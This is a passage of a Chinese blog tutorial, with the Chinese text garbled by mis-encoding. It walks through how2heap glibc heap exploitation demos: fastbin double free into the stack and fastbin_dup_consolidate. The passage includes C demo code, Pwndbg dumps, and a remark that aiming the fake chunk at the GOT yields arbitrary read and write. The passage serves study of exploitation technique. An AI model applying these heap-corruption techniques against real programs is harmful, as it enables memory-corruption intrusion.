gdb æŒ‚è½½ç¨‹åºã€‚</p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/20180814172825.png" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/20180814172825.png"></a></p><p>ç¨‹åºé€šç”¨ malloc äº†ä¸‰ä¸ª chunk,ç´§æ¥ç€é€šè¿‡ fastbin double free çš„æ“ä½œå½¢æˆäº†å¦‚ä¸‹freelistã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Pwndbg&gt; fastbins</span><br><span class="line">fastbins</span><br><span class="line">0x20: 0x603000 â€”â–¸ 0x603020 â—‚â€” 0x603000</span><br><span class="line">0x30: 0x0</span><br><span class="line">0x40: 0x0</span><br><span class="line">0x50: 0x0</span><br><span class="line">0x60: 0x0</span><br><span class="line">0x70: 0x0</span><br><span class="line">0x80: 0x0</span><br></pre></td></tr></table></figure><p>ç„¶åå‘¢ æˆ‘å†malloc chunk d</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">  <span class="number">36</span> <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> *d = <span class="built_in">malloc</span>(<span class="number">8</span>);</span><br><span class="line">  <span class="number">37</span></span><br><span class="line">  <span class="number">38</span> <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;1st malloc(8): %p\n&quot;</span>, d);</span><br><span class="line">  <span class="number">39</span> <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;2nd malloc(8): %p\n&quot;</span>, <span class="built_in">malloc</span>(<span class="number">8</span>));</span><br><span class="line">  <span class="number">40</span> <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Now the free list has [ %p ].\n&quot;</span>, a);</span><br><span class="line">â–º <span class="number">41</span> <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Now, we have access to %p while it remains at the head of the free list.\n&quot;</span></span><br><span class="line">  <span class="number">42</span> <span class="string">&quot;so now we are writing a fake free size (in this case, 0x20) to the stack,\n&quot;</span></span><br><span class="line">  <span class="number">43</span> <span class="string">&quot;so that malloc will think there is a free chunk there and agree to\n&quot;</span></span><br><span class="line">  <span class="number">44</span> <span class="string">&quot;return a pointer to it.\n&quot;</span>, a);</span><br><span class="line">  <span class="number">45</span> stack_var = <span class="number">0x20</span>;</span><br></pre></td></tr></table></figure><p>è¿™ä¸ªæ—¶å€™ ç¨‹åºä¼šä» fastbins é‡Œå–ä¸€ä¸ªï¼Œç”±äºfastbins æ˜¯ LIFO ï¼ˆLast in First outï¼‰ã€‚ chunk A ä¼šè¢«å–å‡ºä½¿ç”¨ã€‚å€˜è‹¥æˆ‘ä»¬è¿™ä¸ªæ—¶å€™èƒ½å¯¹ chunk D è¿›è¡Œæ“ä½œï¼Œå¦‚ <code>d = (unsigned long long) (((char*)&amp;stack_var) - sizeof(d));</code> ç”±äº <code>stack_var = 0x20;</code>è¿™æ ·çš„å®šä¹‰æ˜¯åœ¨å‡½æ•°å†…ï¼Œæ‰€ä»¥<code>stack_var</code>çš„åœ°å€å°†åœ¨æ ˆä¸Šï¼Œé€šè¿‡å¯¹æŒ‡é’ˆ <strong>d</strong> çš„æ“ä½œï¼Œæˆ‘ä»¬å¯ä»¥ä¼ªé€ ä¸€ä¸ª chunk ï¼Œå¹¶å°†è¿™ä¸ª chunk æ”¾åœ¨æ ˆä¸Šã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">Pwndbg&gt; x&#x2F;20a 0x603000</span><br><span class="line">0x603000:0x00x21</span><br><span class="line">0x603010:0x7fffffffe3880x0</span><br><span class="line">0x603020:0x00x21</span><br><span class="line">0x603030:0x6030000x0</span><br><span class="line">0x603040:0x00x21</span><br><span class="line">0x603050:0x00x0</span><br><span class="line">0x603060:0x00x20fa1</span><br><span class="line">0x603070:0x00x0</span><br><span class="line">0x603080:0x00x0</span><br><span class="line">0x603090:0x00x0</span><br><span class="line">Pwndbg&gt; x&#x2F;20a 0x7fffffffe388</span><br><span class="line">0x7fffffffe388:0x40097c &lt;main+758&gt;0x20</span><br><span class="line">0x7fffffffe398:0x6030100x603030</span><br><span class="line">0x7fffffffe3a8:0x6030500x603010</span><br><span class="line">0x7fffffffe3b8:0xc3e158ae04ceee000x4009a0 &lt;__libc_csu_init&gt;</span><br><span class="line">0x7fffffffe3c8:0x7ffff7a303f1 &lt;__libc_start_main+241&gt;0x40000</span><br><span class="line">0x7fffffffe3d8:0x7fffffffe4a80x1f7b9a488</span><br><span class="line">0x7fffffffe3e8:0x400686 &lt;main&gt;0x0</span><br><span class="line">0x7fffffffe3f8:0x4ffa6e8ae3316c560x400590 &lt;_start&gt;</span><br><span class="line">0x7fffffffe408:0x7fffffffe4a00x0</span><br><span class="line">0x7fffffffe418:0x00xb00591f537d16c56</span><br><span class="line">Pwndbg&gt; stack 10</span><br><span class="line">00:0000â”‚ rsp  0x7fffffffe390 â—‚â€” 0x20 &#x2F;* &#39; &#39; *&#x2F;</span><br><span class="line">01:0008â”‚      0x7fffffffe398 â€”â–¸ 0x603010 â€”â–¸ 0x7fffffffe388 â€”â–¸ 0x40097c (main+758) â—‚â€” 0x4d8b4800000000b8</span><br><span class="line">02:0010â”‚      0x7fffffffe3a0 â€”â–¸ 0x603030 â€”â–¸ 0x603000 â—‚â€” 0x0</span><br><span class="line">03:0018â”‚      0x7fffffffe3a8 â€”â–¸ 0x603050 â—‚â€” 0x0</span><br><span class="line">04:0020â”‚      0x7fffffffe3b0 â€”â–¸ 0x603010 â€”â–¸ 0x7fffffffe388 â€”â–¸ 0x40097c (main+758) â—‚â€” 0x4d8b4800000000b8</span><br><span class="line">05:0028â”‚      0x7fffffffe3b8 â—‚â€” 0xc3e158ae04ceee00</span><br><span class="line">06:0030â”‚ rbp  0x7fffffffe3c0 â€”â–¸ 0x4009a0 (__libc_csu_init) â—‚â€” 0x41ff894156415741</span><br><span class="line">07:0038â”‚      0x7fffffffe3c8 â€”â–¸ 0x7ffff7a303f1 (__libc_start_main+241) â—‚â€” mov    edi, eax</span><br><span class="line">08:0040â”‚      0x7fffffffe3d0 â—‚â€” 0x40000</span><br><span class="line">09:0048â”‚      0x7fffffffe3d8 â€”â–¸ 0x7fffffffe4a8 â€”â–¸ 0x7fffffffe6ea â—‚â€” 0x77732f656d6f682f (&#39;&#x2F;home&#x2F;sw&#39;)</span><br></pre></td></tr></table></figure><p><code>stack_var = 0x20;</code> æ˜¯ç”±äºä¼ªé€ çš„ chunk è¦ç”± è®¾ç½®sizeï¼Œsizeçš„ä½ç½®ä½äº åœ°å€-0x8çš„åœ°æ–¹ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">âœ  glibc_2.25 git:(master) âœ— .&#x2F;fastbin_dup_into_stack</span><br><span class="line">This file extends on fastbin_dup.c by tricking malloc into</span><br><span class="line">returning a pointer to a controlled location (in this case, the stack).</span><br><span class="line">The address we want malloc() to return is 0x7fff02a085c8.</span><br><span class="line">Allocating 3 buffers.</span><br><span class="line">1st malloc(8): 0x146b010</span><br><span class="line">2nd malloc(8): 0x146b030</span><br><span class="line">3rd malloc(8): 0x146b050</span><br><span class="line">Freeing the first one...</span><br><span class="line">If we free 0x146b010 again, things will crash because 0x146b010 is at the top of the free list.</span><br><span class="line">So, instead, we&#39;ll free 0x146b030.</span><br><span class="line">Now, we can free 0x146b010 again, since it&#39;s not the head of the free list.</span><br><span class="line">Now the free list has [ 0x146b010, 0x146b030, 0x146b010 ]. We&#39;ll now carry out our attack by modifying data at 0x146b010.</span><br><span class="line">1st malloc(8): 0x146b010</span><br><span class="line">2nd malloc(8): 0x146b030</span><br><span class="line">Now the free list has [ 0x146b010 ].</span><br><span class="line">Now, we have access to 0x146b010 while it remains at the head of the free list.</span><br><span class="line">so now we are writing a fake free size (in this case, 0x20) to the stack,</span><br><span class="line">so that malloc will think there is a free chunk there and agree to</span><br><span class="line">return a pointer to it.</span><br><span class="line">Now, we overwrite the first 8 bytes of the data at 0x146b010 to point right before the 0x20.</span><br><span class="line">3rd malloc(8): 0x146b010, putting the stack address on the free list</span><br><span class="line">4th malloc(8): 0x7fff02a085c8</span><br></pre></td></tr></table></figure><p>æœ€åæ•ˆæœå¦‚ä¸Šï¼Œæˆ‘ä»¬å‘ç°å½“ chunk a è¢«æ‹¿å‡ºæ¥å,ç”±äºæˆ‘ä»¬ä¼ªé€ äº†chunk a çš„ fdï¼Œé€ æˆå¦‚ä¸‹æ•ˆæœã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Pwndbg&gt; fastbins</span><br><span class="line">fastbins</span><br><span class="line">0x20: 0x603000 â€”â–¸ 0x7fffffffe388 â€”â–¸ 0x603010 â—‚â€” 0x0</span><br><span class="line">0x30: 0x0</span><br><span class="line">0x40: 0x0</span><br><span class="line">0x50: 0x0</span><br><span class="line">0x60: 0x0</span><br><span class="line">0x70: 0x0</span><br><span class="line">0x80: 0x0</span><br></pre></td></tr></table></figure><p>è¿™ä¸ªæ—¶å€™å½¢æˆå¦‚ä¸Šçš„é“¾è¡¨ç»“æ„ï¼Œè¿™ä¸ªæ—¶å€™å½“æˆ‘ä»¬å† malloc ä¸€å—å†…å­˜çš„æ—¶å€™ï¼Œç³»ç»Ÿä¼šè¯¯ä»¥ä¸º æ˜¯æˆ‘ä»¬ fake çš„chunkæ˜¯freeçš„ã€‚ä»–ä¼šæŠŠè¿™å— chunk æ‹¿å‡ºæ¥ç”¨ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">Pwndbg&gt; heap</span><br><span class="line">Top Chunk: 0x603060</span><br><span class="line">Last Remainder: 0</span><br><span class="line"></span><br><span class="line">0x603000 FASTBIN &#123;</span><br><span class="line">  prev_size = 0x0,</span><br><span class="line">  size = 0x21,</span><br><span class="line">  fd = 0x7fffffffe388,</span><br><span class="line">  bk = 0x0,</span><br><span class="line">  fd_nextsize = 0x0,</span><br><span class="line">  bk_nextsize = 0x21</span><br><span class="line">&#125;</span><br><span class="line">0x603020 FASTBIN &#123;</span><br><span class="line">  prev_size = 0x0,</span><br><span class="line">  size = 0x21,</span><br><span class="line">  fd = 0x603000,</span><br><span class="line">  bk = 0x0,</span><br><span class="line">  fd_nextsize = 0x0,</span><br><span class="line">  bk_nextsize = 0x21</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å°ç»“ï¼šå¯¹äº fastbinsï¼Œå¯ä»¥é€šè¿‡ double-free è¦†ç›– fastbins çš„ç»“æ„ï¼Œæ¥è·å¾—ä¸€ä¸ªæŒ‡å‘ä»»æ„åœ°å€çš„æŒ‡é’ˆã€‚å¦‚æœæˆ‘ä»¬æŠŠè¿™ä¸ªåœ°å€æŒ‡å‘ got åœ°å€ï¼Œå¦‚æœæˆ‘ä»¬å¯å¯¹ chunk è¿›è¡Œå†™æˆ–è€…è¯»æ“ä½œï¼Œæˆ‘ä»¬å°±æœ‰äº†ä»»æ„åœ°å€å†™ å’Œ ä»»æ„åœ°å€è¯»ã€‚</p><h3 id="0x04-fastbin-dup-consolidate"><a href="#0x04-fastbin-dup-consolidate" class="headerlink" title="0x04 fastbin_dup_consolidate"></a>0x04 fastbin_dup_consolidate</h3><p>æˆ‘ä»¬ä¸Šä¸€æ¡ 0x02 ä»‹ç»äº†ä¸€ä¸ª fast double free çš„ç»•è¿‡æœºåˆ¶ï¼Œé€šè¿‡åœ¨free åŒä¸€ä¸ª chunkä¸­çš„ä¸­é—´æ’å…¥å¯¹å¦å¤–ä¸€ä¸ªchunk çš„freeã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">free</span>(p1);</span><br><span class="line"><span class="built_in">free</span>(p2);</span><br><span class="line"><span class="built_in">free</span>(p1);</span><br></pre></td></tr></table></figure><p>è¿™é‡Œ shellphish å‘æˆ‘ä»¬å±•ç¤ºäº† large bin ä¸­ mallo_consolidata æœºåˆ¶ fast å¯¹double free çš„æ£€æŸ¥</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">void</span>* p1 = <span class="built_in">malloc</span>(<span class="number">0x40</span>);</span><br><span class="line">  <span class="keyword">void</span>* p2 = <span class="built_in">malloc</span>(<span class="number">0x40</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Allocated two fastbins: p1=%p p2=%p\n&quot;</span>, p1, p2);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Now free p1!\n&quot;</span>);</span><br><span class="line">  <span class="built_in">free</span>(p1);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">void</span>* p3 = <span class="built_in">malloc</span>(<span class="number">0x400</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Allocated large bin to trigger malloc_consolidate(): p3=%p\n&quot;</span>, p3);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;In malloc_consolidate(), p1 is moved to the unsorted bin.\n&quot;</span>);</span><br><span class="line">  <span class="built_in">free</span>(p1);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Trigger the double free vulnerability!\n&quot;</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;We can pass the check in malloc() since p1 is not fast top.\n&quot;</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Now p1 is in unsorted bin and fast bin. So we&#x27;will get it twice: %p %p\n&quot;</span>, <span class="built_in">malloc</span>(<span class="number">0x40</span>), <span class="built_in">malloc</span>(<span class="number">0x40</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åŒæ ·çš„ç¼–è¯‘å gdb æŒ‚è½½è¿è¡Œã€‚</p><p>é¦–å…ˆæ˜¯ä¸¤ä¸ªmalloc</p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/20180814182745.png" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/20180814182745.png"></a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">Pwndbg&gt; heap</span><br><span class="line">Top Chunk: 0x6020a0</span><br><span class="line">Last Remainder: 0</span><br><span class="line"></span><br><span class="line">0x602000 FASTBIN &#123;</span><br><span class="line">  prev_size = 0x0,</span><br><span class="line">  size = 0x51,</span><br><span class="line">  fd = 0x0,</span><br><span class="line">  bk = 0x0,</span><br><span class="line">  fd_nextsize = 0x0,</span><br><span class="line">  bk_nextsize = 0x0</span><br><span class="line">&#125;</span><br><span class="line">0x602050 FASTBIN &#123;</span><br><span class="line">  prev_size = 0x0,</span><br><span class="line">  size = 0x51,</span><br><span class="line">  fd = 0x0,</span><br><span class="line">  bk = 0x0,</span><br><span class="line">  fd_nextsize = 0x0,</span><br><span class="line">  bk_nextsize = 0x0</span><br><span class="line">&#125;</span><br><span class="line">0x6020a0 PREV_INUSE &#123;</span><br><span class="line">  prev_size = 0x0,</span><br><span class="line">  size = 0x20f61,</span><br><span class="line">  fd = 0x0,</span><br><span class="line">  bk = 0x0,</span><br><span class="line">  fd_nextsize = 0x0,</span><br><span class="line">  bk_nextsize = 0x0</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç„¶åé‡Šæ”¾ p 1,è®²ä»–åŠ å…¥åˆ° fastbinsä¸­</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Pwndbg&gt; fastbins</span><br><span class="line">fastbins</span><br><span class="line">0x20: 0x0</span><br><span class="line">0x30: 0x0</span><br><span class="line">0x40: 0x0</span><br><span class="line">0x50: 0x602000 â—‚â€” 0x0</span><br><span class="line">0x60: 0x0</span><br><span class="line">0x70: 0x0</span><br><span class="line">0x80: 0x0</span><br><span class="line">Pwndbg&gt; heap</span><br></pre></td></tr></table></figure><p>å½“æˆ‘ä»¬åœ¨ä¸­æ’å…¥ <code>malloc(0x400)</code> åˆ›å»ºä¸€ä¸ª large binsçš„æ—¶å€™ã€‚</p><hr><p>large bins</p><p> chunk çš„æŒ‡é’ˆæ•°ç»„, æ¯ä¸ªå…ƒç´ æ˜¯ä¸€æ¡ åŒå‘å¾ªç¯é“¾è¡¨çš„å¤´éƒ¨, ä½†åŒä¸€æ¡é“¾è¡¨ä¸­å—çš„å¤§å°ä¸ä¸€ å®šç›¸åŒ, æŒ‰ç…§ä»å¤§åˆ°å°çš„é¡ºåºæ’åˆ—, æ¯ä¸ª bin ä¿å­˜ä¸€å®š å¤§å°èŒƒå›´çš„å—ã€‚ä¸»è¦ä¿å­˜å¤§å° 1024 å­—èŠ‚ä»¥ä¸Šçš„å—ã€‚ </p><hr><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">Pwndbg&gt; fastbins</span><br><span class="line">fastbins</span><br><span class="line">0x20: 0x0</span><br><span class="line">0x30: 0x0</span><br><span class="line">0x40: 0x0</span><br><span class="line">0x50: 0x0</span><br><span class="line">0x60: 0x0</span><br><span class="line">0x70: 0x0</span><br><span class="line">0x80: 0x0</span><br><span class="line">Pwndbg&gt; small bins</span><br><span class="line">No symbol <span class="string">&quot;bins&quot;</span> <span class="keyword">in</span> current context.</span><br><span class="line">smallbins</span><br><span class="line">0x20: 0x7ffff7dd1b68 (main_arena+104) â—‚â€” 0x7ffff7dd1b68</span><br><span class="line">0x30: 0x7ffff7dd1b78 (main_arena+120) â—‚â€” 0x7ffff7dd1b78</span><br><span class="line">0x40: 0x7ffff7dd1b88 (main_arena+136) â—‚â€” 0x7ffff7dd1b88</span><br><span class="line">0x50: 0x602000 â€”â–¸ 0x7ffff7dd1b98 (main_arena+152) â—‚â€” 0x602000</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬ä¼šå‘ç° åŸæœ¬åœ¨ fastbins çš„ chunk p1 è·‘åˆ°äº† small bins é‡Œã€‚è€Œä¸” chunk p2 çš„prev_size å’Œsizeå­—æ®µéƒ½è¢«ä¿®æ”¹äº†</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">Pwndbg&gt; heap</span><br><span class="line">Top Chunk: 0x6024b0</span><br><span class="line">Last Remainder: 0</span><br><span class="line"></span><br><span class="line">0x602000 FASTBIN &#123;</span><br><span class="line">  prev_size = 0x0,</span><br><span class="line">  size = 0x51,</span><br><span class="line">  fd = 0x7ffff7dd1b98 &lt;main_arena+152&gt;,</span><br><span class="line">  bk = 0x7ffff7dd1b98 &lt;main_arena+152&gt;,</span><br><span class="line">  fd_nextsize = 0x0,</span><br><span class="line">  bk_nextsize = 0x0</span><br><span class="line">&#125;</span><br><span class="line">0x602050 &#123;</span><br><span class="line">  prev_size = 0x50,</span><br><span class="line">  size = 0x50,</span><br><span class="line">  fd = 0x0,</span><br><span class="line">  bk = 0x0,</span><br><span class="line">  fd_nextsize = 0x0,</span><br><span class="line">  bk_nextsize = 0x0</span><br><span class="line">&#125;</span><br><span class="line">0x6020a0 PREV_INUSE &#123;</span><br><span class="line">  prev_size = 0x0,</span><br><span class="line">  size = 0x411,</span><br><span class="line">  fd = 0x0,</span><br><span class="line">  bk = 0x0,</span><br><span class="line">  fd_nextsize = 0x0,</span><br><span class="line">  bk_nextsize = 0x0</span><br><span class="line">&#125;</span><br><span class="line">0x6024b0 PREV_INUSE &#123;</span><br><span class="line">  prev_size = 0x0,</span><br><span class="line">  size = 0x20b51,</span><br><span class="line">  fd = 0x0,</span><br><span class="line">  bk = 0x0,</span><br><span class="line">  fd_nextsize = 0x0,</span><br><span class="line">  bk_nextsize = 0x0</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬å¯ä»¥çœ‹çœ‹ large binçš„åˆ†é…</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   If this is a large request, consolidate fastbins before continuing.</span></span><br><span class="line"><span class="comment">   While it might look excessive to kill all fastbins before</span></span><br><span class="line"><span class="comment">   even seeing if there is space available, this avoids</span></span><br><span class="line"><span class="comment">   fragmentation problems normally associated with fastbins.</span></span><br><span class="line"><span class="comment">   Also, in practice, programs tend to have runs of either small or</span></span><br><span class="line"><span class="comment">   large requests, but less often mixtures, so consolidation is not</span></span><br><span class="line"><span class="comment">   invoked all that often in most programs. And the programs that</span></span><br><span class="line"><span class="comment">   it is called frequently in otherwise tend to fragment.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    idx = largebin_index (nb);</span><br><span class="line">    <span class="keyword">if</span> (have_fastchunks (av))</span><br><span class="line">      malloc_consolidate (av);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>å½“åˆ†é… large chunk æ—¶ï¼Œé¦–å…ˆæ ¹æ® chunk çš„å¤§å°è·å¾—å¯¹åº”çš„ large bin çš„ indexï¼Œæ¥ç€åˆ¤æ–­å½“å‰åˆ†é…åŒºçš„ fast bins ä¸­æ˜¯å¦åŒ…å« chunkï¼Œå¦‚æœæœ‰ï¼Œè°ƒç”¨ malloc_consolidate() å‡½æ•°åˆå¹¶ fast bins ä¸­çš„ chunkï¼Œå¹¶å°†è¿™äº›ç©ºé—² chunk åŠ å…¥ unsorted bin ä¸­ã€‚å› ä¸ºè¿™é‡Œåˆ†é…çš„æ˜¯ä¸€ä¸ª large chunkï¼Œæ‰€ä»¥ unsorted bin ä¸­çš„ chunk æŒ‰ç…§å¤§å°è¢«æ”¾å› small bins æˆ– large bins ä¸­ã€‚è¿™ä¸ªæ—¶å€™æˆ‘ä»¬å°±å¯ä»¥å†æ¬¡é‡Šæ”¾ p1</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">Pwndbg&gt; fastbins</span><br><span class="line">fastbins</span><br><span class="line">0x20: 0x0</span><br><span class="line">0x30: 0x0</span><br><span class="line">0x40: 0x0</span><br><span class="line">0x50: 0x602000 â—‚â€” 0x0</span><br><span class="line">0x60: 0x0</span><br><span class="line">0x70: 0x0</span><br><span class="line">0x80: 0x0</span><br><span class="line">Pwndbg&gt; smallbins</span><br><span class="line">smallbins</span><br><span class="line">0x20: 0x7ffff7dd1b68 (main_arena+104) â—‚â€” 0x7ffff7dd1b68</span><br><span class="line">0x30: 0x7ffff7dd1b78 (main_arena+120) â—‚â€” 0x7ffff7dd1b78</span><br><span class="line">0x40: 0x7ffff7dd1b88 (main_arena+136) â—‚â€” 0x7ffff7dd1b88</span><br><span class="line">0x50: 0x602000 â—‚â€” 0x0</span><br></pre></td></tr></table></figure><p>è¿™ä¸ªæ—¶å€™ï¼Œæˆ‘ä»¬æ—¢æœ‰fastbinsä¸­çš„ chunk p1 ä¹Ÿæœ‰small bins çš„chunk p2ã€‚æˆ‘ä»¬å¯ä»¥mallocä¸¤æ¬¡ï¼Œç¬¬ä¸€æ¬¡ä»fastbinså–å‡ºï¼Œç¬¬äºŒæ¬¡ä»small binsä¸­å–å‡ºã€‚ä¸”è¿™ä¸¤å—æ–° chunk å¤„äºåŒä¸€ä¸ªä½ç½®ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span 